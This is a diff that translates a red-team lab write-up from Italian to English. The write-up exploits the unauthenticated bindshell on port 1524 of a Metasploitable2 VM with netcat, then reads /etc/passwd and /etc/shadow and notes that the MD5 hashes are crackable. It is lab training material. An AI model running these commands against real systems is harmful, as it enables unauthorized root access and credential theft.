@@ -1,33 +1,33 @@
-# 01 — Exploitation: Bindshell Porta 1524
+# 01 — Exploitation: Bindshell Port 1524
 
-## Categoria
+## Category
 Red Team / Exploitation / Backdoor Access
 
-## Obiettivo
-Accedere al sistema target sfruttando una backdoor (bindshell)
-in ascolto sulla porta 1524 senza autenticazione.
+## Objective
+Access the target system by exploiting a backdoor (bindshell)
+listening on port 1524 with no authentication.
 
-## Ambiente
+## Environment
 
-| Ruolo | VM | IP |
+| Role | VM | IP |
 |---|---|---|
 | Attacker | Kali Linux | 10.10.10.100 |
 | Target | Metasploitable2 | 10.10.10.101 |
 
 ## Tool
-**Netcat (nc)** — utility per connessioni TCP/UDP raw, preinstallata su Kali.
+**Netcat (nc)** — TCP/UDP raw connection utility, pre-installed on Kali.
 
-## Procedura
+## Procedure
 
 ```bash
 nc 10.10.10.101 1524
 ```
 
-Un solo comando. Nessuna password. Accesso immediato come root.
+Single command. No password. Immediate root access.
 
-## Esecuzione — Output Completo
+## Execution — Full Output
 
-### Accesso Root e Ricognizione Iniziale
+### Root Access and Initial Recon
 ```bash
 nc 10.10.10.101 1524
 whoami      # root
@@ -36,13 +36,13 @@ pwd         # /
 ls /home/   # ftp  msfadmin  service  user
 ```
 
-![Root shell - whoami e uname](screenshots/meta-05-bindshell-root-whoami-uname.png)
+![Root shell - whoami and uname](screenshots/meta-05-bindshell-root-whoami-uname.png)
 
-### Utenti del Sistema — /etc/passwd
+### System Users — /etc/passwd
 ```bash
 cat /etc/passwd
 ```
-Utenti con shell interattiva (`/bin/bash`):
+Users with interactive shell (`/bin/bash`):
 - `root` (uid 0)
 - `msfadmin` (uid 1000)
 - `user` (uid 1001)
@@ -50,40 +50,40 @@ Utenti con shell interattiva (`/bin/bash`):
 
 ![/etc/passwd](screenshots/meta-06-etc-passwd.png)
 
-### Hash Password — /etc/shadow
+### Password Hashes — /etc/shadow
 ```bash
 cat /etc/shadow
 ```
 
 ![/etc/shadow](screenshots/meta-07-etc-shadow.png)
 
-| Utente | Prefisso Hash | Algoritmo |
+| User | Hash Prefix | Algorithm |
 |---|---|---|
-| root | `$1$` | MD5 — obsoleto |
-| msfadmin | `$1$` | MD5 — obsoleto |
-| user | `$1$` | MD5 — obsoleto |
+| root | `$1$` | MD5 — obsolete |
+| msfadmin | `$1$` | MD5 — obsolete |
+| user | `$1$` | MD5 — obsolete |
 
-## Spiegazione Tecnica
+## Technical Explanation
 
-Un **bindshell** è un processo che ascolta su una porta e,
-a ogni connessione, avvia una shell collegata al socket.
-Chiunque raggiunga la porta ottiene accesso diretto.
+A **bindshell** is a process listening on a port that, upon each
+connection, spawns a shell connected to the socket.
+Anyone who reaches the port gets direct access.
 
-In un contesto reale questa configurazione esiste quando:
-- Un malware installa una backdoor
-- Un amministratore lascia una porta di debug aperta
-- Una misconfiguration espone un servizio interno
+In a real context this configuration exists when:
+- Malware installs a backdoor
+- An administrator leaves a debug port open
+- A misconfiguration exposes an internal service
 
-## Risultato
-- Accesso root ottenuto ✅
-- /etc/passwd letto ✅
-- /etc/shadow estratto (hash MD5 crackabili) ✅
+## Result
+- Root access obtained ✅
+- /etc/passwd read ✅
+- /etc/shadow extracted (crackable MD5 hashes) ✅
 
 ## Snapshot
 `02-kali-prima-exploitation-bindshell`
 
-## Lezioni Imparate
-- La ricognizione nmap ha rivelato la porta — senza enumeration
-  non avremmo saputo dove colpire
-- Non tutti gli exploit richiedono tool complessi
-- MD5-crypt (`$1$`) è crackabile in pochi minuti con GPU moderna
+## Lessons Learned
+- nmap recon revealed the port — without enumeration
+  we would not have known where to strike
+- Not all exploits require complex tools
+- MD5-crypt (`$1$`) is crackable in minutes with a modern GPU
